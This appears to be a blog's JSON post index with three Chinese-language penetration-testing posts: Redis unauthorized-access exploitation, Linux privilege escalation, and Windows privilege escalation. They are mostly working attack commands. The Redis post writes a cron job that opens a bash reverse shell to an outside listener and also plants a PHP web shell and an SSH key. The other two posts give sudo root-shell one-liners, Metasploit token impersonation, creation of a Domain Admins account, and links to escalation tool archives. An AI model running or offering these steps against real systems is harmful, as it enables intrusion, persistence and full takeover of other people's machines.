{"pages":[],"posts":[{"title":"渗透测试-Redis未授权访问 getshell","text":"RedisRedis在默认情况下，会绑定在0.0.0.0:6379，如果没有采用限制IP访问，就会将Redis服务暴露在公网上，并且在没有设置密码认证的情况下，会导致任意用户未授权访问Redis以及读取Redis数据并写入公钥进行远程连接等。 本地漏洞环境搭建靶机：CentOS6.5 CentOS安装redis： 1234wget http://download.redis.io/releases/redis-3.2.0.tar.gztar xzf redis-3.2.0.tar.gzcd redis-3.2.0make 修改配置文件，使可以远程访问： 123vim redis.confbind 127.0.0.1前面加上#号 protected-mode设为no 启动redis-server./src/redis-server redis-conf 默认的配置是使用6379端口，没有密码。这时候会导致未授权访问然后使用redis权限写文件。 Redis常见getshell方法1.反弹shell123456789root@kali:~# redis-cli -h 192.168.128.145192.168.128.145:6379&gt; set x &quot;\\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.128.136/2334 0&gt;&amp;1\\n&quot;OK192.168.128.145:6379&gt; config set dir /var/spool/cron/OK192.168.128.145:6379&gt; config set dbfilename rootOK192.168.128.145:6379&gt; saveOK 12192.168.128.136主机：root@192.168.128.136:~# nc -lvvp 2334 2.写入webshell123456789root@kali:~# redis-cli -h 192.168.128.145192.168.128.145:6379&gt; config set dir /var/www/html/OK192.168.128.145:6379&gt; config set dbfilename shell.phpOK192.168.128.145:6379&gt; set x &quot;&lt;?php phpinfo();?&gt;&quot;OK192.168.128.145:6379&gt; saveOK webshell访问http://192.168.128.145/shell.php 3.写入SSH密钥生成SSH密钥 1root@kali:~/.ssh# ssh-keygen -t rsa 复制生成的id_rsa.pub文件内容写入redis，注意密钥一定要在前后各加入”\\n\\n\\n”写入 123456789root@kali:~# redis-cli -h 192.168.128.145192.168.128.145:6379&gt; config set dir /root/.ssh/OK192.168.128.145:6379&gt; config set dbfilename authorized_keysOK192.168.128.145:6379&gt; set x &quot;\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\\n\\n\\n&quot;OK192.168.128.145:6379&gt; saveOK 12root@kali:~# ssh -i id_rsa root@192.168.128.145root@192.168.128.145:~# 安全修复1、限制登录ip2、添加密码","link":"/2020/04/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-getshell/"},{"title":"权限提升-Linux常见提权方法、工具","text":"ed编辑器提权关键步骤：使用sudo运行ed编辑器(一般情况下使用sudo要输入当前用户密码) 12345test:~$ sudo ed!/bin/bashroot:~# iduid=0(root) gid=0(root) groups=0(root) sudo 注入工具：https://github.com/wsfengfan/blog/blob/master/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-sudo%E6%B3%A8%E5%85%A5.rar 1、exploit.sh 1234test:~$ sh exploit.shtest:~$ sudo -iroot:~# iduid=0(root) gid=0(root) groups=0(root) 2、exploit_v2.sh 1234test:~$ sh exploit_v2.shtest:~$ /tmp/sh -proot:~# iduid=0(root) gid=0(root) groups=0(root) 3、exploit_v3.sh 123test:~$ sh exploit_v3.shroot:~# iduid=0(root) gid=0(root) groups=0(root) sudo ld.so自己判断系统下的ld.so文件位置和版本，一般情况在 /lib 文件下 123test:~$ sudo /lib/x86_64-linux-gnu/ld-2.29.so /usr/bin/python -c 'import os;os.setuid(0);os.system(&quot;/bin/bash&quot;)'root:~# iduid=0(root) gid=0(root) groups=0(root)","link":"/2020/04/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E3%80%81%E5%B7%A5%E5%85%B7/"},{"title":"权限提升-Window常见提权方法、工具","text":"metasploit利用方法1、service_permissions 模块在该模块下选择您的session ID 1msf5 exploit(windows/local/service_permissions) &gt; set sesions 2 选择”AGGRESSIVE”选项，可以利用目标机器每一个缺陷服务进行提权 1msf5 exploit(windows/local/service_permissions) &gt; set AGGRESSIVE true 2、always_install_elevated 模块该方法只要禁止注册表键 AlwaysInstallElevated。就可以阻止攻击者通过MSI文件进行提权。 3、trusted_service_path 模块此提权很容易被中断，需要不断的通信 需要在进程结束之前将它迁移到其他进程中，可以使用“set AytoRunScript migrate -f”命令自动迁移 4、enum_unattend 模块 5、令牌窃取使用msf5 &gt; sessions -i 1命令，把获取的session会话变成meterpreter会话 123meterpreter&gt; use incognitometerpreter&gt; list_tokens -umeterpreter&gt; impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot; 6、添加域用户1234567meterpreter&gt;use incognitometerpreter&gt;add_user test password -h 192.168.128.139//在域控上添加账户meterpreter&gt;add_group_user &quot;Domain Admins&quot; test -h 192.168.128.139//将该账户加到域管理组 Psexec.exe incognito.exe Tokenvator.exe工具：https://github.com/wsfengfan/blog/blob/master/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-window.rar 12345678Psexec:C:\\temp&gt; psexec -s -i cmd.exeincognito:C:\\temp&gt; incognito.exe execute -c &quot;NT AUTHORITY\\SYSTEM&quot; cmd.exeTokenvator:C:\\temp&gt; Tokenvator.exe getsystem cmd.exe ctftool 提权工具：https://github.com/wsfengfan/blog/blob/master/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-window.rar 12c:\\&gt;ctftoolctf&gt; script .\\scripts\\ctf-consent-system.ctf Bypass-UAC.ps1工具：https://github.com/wsfengfan/blog/blob/master/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-window.rar","link":"/2020/04/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Window%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E3%80%81%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","link":"/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"权限提升","slug":"权限提升","link":"/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"}],"categories":[]}